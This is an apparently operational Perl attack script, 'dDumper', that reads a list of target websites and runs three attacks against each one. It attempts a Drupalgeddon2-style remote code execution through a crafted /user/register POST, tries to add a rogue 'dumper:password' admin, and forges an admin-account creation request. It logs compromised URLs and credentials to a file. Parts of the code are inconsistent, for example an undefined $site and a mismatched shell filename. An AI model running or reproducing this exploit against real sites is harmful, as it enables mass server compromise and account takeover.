#!/usr/bin/%perl%

use if $^O eq "MSWin32", Win32::Console::ANSI;
use LWP::Simple;
use LWP::UserAgent;
use Term::ANSIColor;
use HTTP::Request;
use HTTP::Request::Common qw(POST);
use HTTP::Request::Common qw(GET);


system(($^O eq 'MSWin32') ? 'cls' : 'clear');
#system(($^O eq 'MSWin32') ? 'mode con:cols=100 lines=40' : 'resize -s 40 100');


sub yak0d3()
{

print color('green'),"
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMd``mMy````````-+mMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM:```````.-oNMMMMMMMMMM
MMMMMMMMd  mMy  yhhhhh/ `mMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMdhhhhhhhy. -MMMMMMMMMM
MMMNmmmmh  mMy  NMMMMMN  sMmmNMMMMMNmNMMmmmmmmmmmNMMMMMNmmmmmmmNMMMMMMMMMMMMMo  MMMMMNmNMM
N+`        mMy  NMMMMMN  sM` yMMMMM/ :Mm           -hMMy        .oMMMMyooooo+` /MMm/`  .MM
: .dNNNNd  mMy  NMMMMMN  sM` yMMMMM/ :Mm  dNN. oNNs  mMy .NNNNNy  sMMMs:::::- `yMM- :mNNMM
. oMMMMMd  mMy  NMMMMMN  sM` yMMMMM/ :Mm  mMM. oMMM  hMy .MMMMMM` +MMMMMMMMMM+ `MM  yMMMMM
- /MMMMMd  mMy  NMMMMMh  hM. /MMMMM/ :Mm  mMM. oMMM  hMy .MMMMMm  oMMMMMMMMMM/ `MM  yMMMMM
m- `.....  mMy  ......  +MMd. `....` :Mm  mMM. oMMM  hMy  ....`  /NM/.......  .hMM  yMMMMM
MMmhyyyyyyyNMmyyyyyyyydNMMMMMmhhhhhhhdMNhhNMMhhdMNNhydMy `hhhhhdNMMMdhhhhhhhhmMMMMhhmMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMmmMdMddNy .MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMhMyMNhNy .MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNMMMMNdmMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
";
	print color('bold red'),"\n=================================\n";
	
	print color('bold white'),"Welcome to dDumper\n";
	print color('bold white'),"[+]Coded By: yak0d3\n";
	print color('bold white'),"[+]Version: 1.0\n";
	print color('bold white'),"[+]Github: https://github.com/yaKode/dDumper\n";
	print color('bold yellow'),"\n			***********DISCLAIMER***********\n		I do not take any responsibility and I am not liable for\n		any damage caused through use of this product.\n		I do not take responsibility for any illegal usage.\n			********************************\n";
	print color('bold red'),"\n=================================\n";

}




yak0d3();
print color('bold blue'),"\n\n#";
print color('bold magenta'),"Enter siteslist path > ";
print color('bold white');
$list=<STDIN>;
chomp($list);
if(!-e $list)
{
while(!-e $list)
{
exit_code() if($list eq 'exit');
print "File doesn't exist!\n";
print color('bold blue'),"\n#";
print color('bold magenta'),"Enter siteslist path > ";
print color('bold white');
$list=<STDIN>;
chomp($list);



}

}



#Multi-Threading will be developed in the next versions.
# while($thds <= 0)
# {

# exit_code() if($thds eq 'exit');

# print "\n#Enter the number of threads > ";

	# $thds=<STDIN>;
	# chomp($thds);
# }

print color('bold blue'),"#";
print color('bold magenta'), "Enter ouputs filename/path > ";
print color('bold white');
$output=<STDIN>;
chomp($output);

system(($^O eq 'MSWin32') ? 'cls' : 'clear');
yak0d3();
print color('bold white'),"		|Type help for `help` screen and `run` to start|\n";

exit_code() if($output eq 'exit');
print color('bold cyan'),"\n\Dumper > ";
print color('bold white');
$cmd=<STDIN>;
chomp($cmd);

while(commands() eq 0)
{
	print color('bold red'), "\nUnknown command!\n";
	print color('bold white'),"Type help for `help` screen.\n";

	print color('bold cyan'),"\n\Dumper > ";
	print color('bold white');
	$cmd=<STDIN>;
	chomp($cmd);

}


sub commands()
{
	while ($cmd eq "-h" or $cmd eq "help" or $cmd eq "usage")
	{
		print color('bold white'),"\n============================\n";
		print "Type -h , help or usage to show this help screen.\n";
		print "Type run, start or exploit to start.\n";
		print color('bold white'),"\n============================\n";
		print color('bold cyan'),"\n\Dumper > ";
		print color('bold white');
		$cmd=<STDIN>;
		chomp($cmd);
	}
	if($cmd eq "exit")
	{
		exit_code();
	}
	elsif($cmd eq "run" or $cmd eq "start" or $cmd eq "exploit")
	{

	system(($^O eq 'MSWin32') ? 'cls' : 'clear');
	system(($^O eq 'MSWin32') ? 'mode con:cols=100 lines=40' : 'resize -s 40 100');
	yak0d3();

	open my $handle, '<', $list;
	chomp(my @targets = <$handle>);
	close $handle;
	$i = 1;
	foreach $target(@targets)
	{

	print color('bold red'),'[';
	print color('bold green'),"$i";
	print color('bold red'),']';
	print color('bold white'),"$target";
	print "\n";
		exploit();
		
		print "\n";
	$i++;
	}
	$i=0;
	}
	else
	{

		return 0;
	}
}





sub exit_code()
{
yak0d3();
print color('bold white'),"\n\n Bye!\n\n";
exit;
}
sub exploit(){


	addnewadmin();
	rce();
	csrf();
}






sub addnewadmin()
{
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (20);

$drupalink = $site;
my $cmd = "$target?url=$target&submit=submit";
$admin ="dumper";
$pass  ="password";
$dr = $site . '/user/login';
$red = $site . '/user/1';
my $checkk = $ua->get("$cmd")->content;
if($checkk =~/Success!/) {

open(my $fd, ">>$output");
print $fd " \n 
[Admin] URL: $target | dumper:password
";
close($fd);

print color('bold blue'), "		[";
print color('bold red') , "+";
print color('bold blue'), "]";
print color('bold white'),"Add Admin ==> " ;
print color('bold green'), "Succeeded\n";


}
else
{
print color('bold blue'), "	[";
print color('bold red') , "-";
print color('bold blue'), "]";
print color('bold white'),"Add Admin => ";
print color('bold red'), "Failed\n";
}

}

sub rce()
{
my $ua = LWP::UserAgent->new;

$cmd = "$target/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax";

$response = $ua->post($cmd, Content => ["form_id" => "user_register_form", "_drupa_ajax" => "1", "mail[#post_render][]" => "exec", "mail[#type]" => "markup", "mail[#markup]" => "Pwned by Drupal Dump3r> dumper.html"]);

$shell = "$target/vuln.html";
my $content = $ua->get("$shell")->content;
if ($content =~ /Vuln/)
{

open(my $fd, ">>$output");
print $fd " \n 
[Shell] URL: $shell
";
close($fd);
print color('bold blue'), "		[";
print color('bold red') , "+";
print color('bold blue'), "]";
print color('bold white'),"RCE ==> ";
print color('bold green'), "Succeeded\n";
}
else{
print color('bold blue'), "	[";
print color('bold red') , "-";
print color('bold blue'), "]";
print color('bold white'),"RCE => ";    
print color('bold red'), "Failed\n";

}

}

sub csrf()
{
my $ua = LWP::UserAgent->new;

$mail = 'new_admin@new_admin.com';
$cmd = "$target/admin/people/create?render=overlay&render=overlay";
$response = $ua->post($cmd, Content-Type => 'multipart/form-data', Content => ['name' => 'new_admin', 'mail' => $mail, 'pass[pass1]' => 'new_password', 'pass[pass2]' => 'new_password', 'status' => '1', 'roles[3]' => '3', 'timezone' => 'Europe/Prague', 'form_build_id' => 'form-oUkbOYDjyZag-LhYFHvlPXM1rJzOHCjlHojoh_hS3pY', 'form_token' => 'cU7nmlpWu-a4UKGFDBcVjEutgvoEidfK1Zgw0HFAtXc' , 'form_id' => 'user_register_form' , 'op' => 'Create new account']);

if ($response =~ /200/)
{
print color('bold blue'), "		[";
print color('bold red') , "+";
print color('bold blue'), "]";
print color('bold white'),"CSRF ==> ";
print color('bold green'), "Succeeded\n";


open(my $fd, ">>$output");
print $fd " \n 
[Admin] URL: $target | $mail:new_password
";
close($fd);
}
else{
print color('bold blue'), "	[";
print color('bold red') , "-";
print color('bold blue'), "]";
print color('bold white'),"CSRF => ";
print color('bold red'), "Failed\n";

}

}
